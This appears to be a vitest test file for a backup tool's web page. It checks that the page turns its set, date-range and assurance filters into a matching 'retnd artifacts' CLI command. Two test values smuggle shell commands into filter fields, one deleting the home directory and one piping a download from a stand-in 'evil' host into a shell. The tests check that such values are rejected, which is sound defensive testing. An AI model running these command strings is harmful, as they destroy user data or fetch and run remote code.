/**
 * Issue #1251: the Backups page's "Same list from the terminal" line has to
 * print the list the screen shows. With a received-date range set, that is
 * `retnd artifacts --since A --until B`, the same inclusive calendar-day
 * bounds the two date inputs apply (backupSelection.ts inReceivedRange). The
 * review of #1256 (O6) added the two filters that had no line at all: a range
 * with no set filter, and an assurance bucket, which `artifacts --assurance`
 * now lists the way `assurance list --bucket` does. A range the CLI would
 * refuse, or a value it cannot spell, gets no line rather than one that lists
 * something else.
 */
import { describe, expect, it } from "vitest";
import { filterEcho } from "./backupRowMenu";
import { artifactsListCommand } from "@shared/assurance/assuranceCommands";

// Raw text through Vite, because tsconfig keeps @types/node out of this program.
import cliMain from "../../../../core/cmd/retnd/main.go?raw";

const SET = "production/billing-mysql";
const KNOWN = [{ id: SET }];
const echo = (f: Partial<Parameters<typeof filterEcho>[0]>) => filterEcho({ set: "", known: KNOWN, after: "", before: "", bucket: null, ...f });

describe("#1251 the set filter's terminal line carries the received-date range", () => {
  it("#1251 with no filter at all there is no line", () => {
    expect(echo({})).toBeNull();
  });

  it("#1251 with no dates it is the set alone, as before", () => {
    expect(echo({ set: SET })).toBe("retnd artifacts --backup-set " + SET);
  });

  it("#1251 the on-or-after date is --since, the on-or-before date --until, since first", () => {
    expect(echo({ set: SET, after: "2026-08-20" })).toBe("retnd artifacts --backup-set " + SET + " --since 2026-08-20");
    expect(echo({ set: SET, before: "2026-08-24" })).toBe("retnd artifacts --backup-set " + SET + " --until 2026-08-24");
    expect(echo({ set: SET, after: "2026-08-20", before: "2026-08-24" })).toBe("retnd artifacts --backup-set " + SET + " --since 2026-08-20 --until 2026-08-24");
    expect(echo({ set: SET, after: "2026-08-22", before: "2026-08-22" })).toBe("retnd artifacts --backup-set " + SET + " --since 2026-08-22 --until 2026-08-22");
  });

  it("#1251 a removed set's id still echoes with its range", () => {
    expect(echo({ set: "production/legacy-redis", after: "2026-08-01" })).toBe("retnd artifacts --backup-set production/legacy-redis --since 2026-08-01");
  });

  it("#1251 an inverted range has no line, because the CLI refuses --until before --since", () => {
    expect(echo({ set: SET, after: "2026-08-24", before: "2026-08-20" })).toBeNull();
    expect(echo({ after: "2026-08-24", before: "2026-08-20" })).toBeNull();
  });

  it("#1251 a bound that is not a calendar date has no line, rather than one that lists more", () => {
    expect(echo({ set: SET, after: "20th August" })).toBeNull();
    expect(echo({ before: "2026-08-24; rm -rf ~" })).toBeNull();
  });

  it("#1251 a set value the filter would not echo stays unechoed with dates too", () => {
    expect(echo({ set: "x;curl evil|sh", after: "2026-08-20", before: "2026-08-24" })).toBeNull();
  });
});

describe("#1251 O6: a range with no set, and an assurance bucket, have a terminal line too", () => {
  it("#1251 a range alone is artifacts with the range", () => {
    expect(echo({ after: "2026-08-20", before: "2026-08-26" })).toBe("retnd artifacts --since 2026-08-20 --until 2026-08-26");
  });

  it("#1251 a bucket is --assurance, after the set and before the range", () => {
    expect(echo({ bucket: "untested" })).toBe("retnd artifacts --assurance untested");
    expect(echo({ set: SET, bucket: "due" })).toBe("retnd artifacts --backup-set " + SET + " --assurance due");
    expect(echo({ set: SET, bucket: "degraded", after: "2026-08-20" })).toBe("retnd artifacts --backup-set " + SET + " --assurance degraded --since 2026-08-20");
  });

  it("#1251 a bucket the CLI does not have is not echoed", () => {
    expect(echo({ bucket: "worrying" })).toBeNull();
  });

  it("#1251 the builder takes every filter, and an empty one is left out", () => {
    expect(artifactsListCommand({ set: SET, bucket: "overdue", since: "2026-08-20", until: "2026-08-24" })).toBe("retnd artifacts --backup-set " + SET + " --assurance overdue --since 2026-08-20 --until 2026-08-24");
    expect(artifactsListCommand({})).toBe("retnd artifacts");
  });
});

describe("#1251 the flags the line prints are ones the CLI has", () => {
  it("#1251 the artifacts synopsis offers --since DATE, --until DATE and --assurance", () => {
    expect(cliMain).toMatch(/\n {2}artifacts \[--source S\] \[--backup-set B\][^\n]*\[--since DATE\] \[--until DATE\]/);
    expect(cliMain).toMatch(/\n {2}artifacts [^\n]*\[--assurance due\|overdue\|degraded\|untested\]/);
  });
  it("#1251 the recover --set synopsis offers --until DATE", () => {
    expect(cliMain).toMatch(/\n {2}recover --set <source\/backup-set> [^\n]*--until DATE/);
  });
});
